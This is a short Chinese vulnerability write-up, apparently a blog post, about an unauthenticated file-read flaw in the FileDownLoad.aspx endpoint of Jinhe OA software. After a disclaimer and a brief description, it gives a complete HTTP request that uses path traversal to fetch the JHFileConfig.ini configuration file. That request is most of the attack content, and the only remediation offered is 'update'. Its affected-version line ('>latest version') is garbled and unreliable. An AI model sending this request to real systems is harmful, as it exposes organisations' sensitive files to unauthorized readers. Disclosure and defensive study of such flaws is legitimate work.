@[toc]
# 免责声明
没有网络安全就没有国家安全，该文章只为学习和交流，利用做违法乱纪的事，与本人无关
# 漏洞描述
金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同
# 漏洞原理
在FileDownLoad.aspx接口存在文件读取的漏洞，未经授权攻击者可以用过调用该接口获取系统的敏感信息

# 影响版本
`>最新版本`

# 漏洞复现
构造请求包
```yaml
GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
```
发送请求包
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/cc18d691849340f99f9179139b1e3a9a.png)
# 修复建议
更新到最新版本

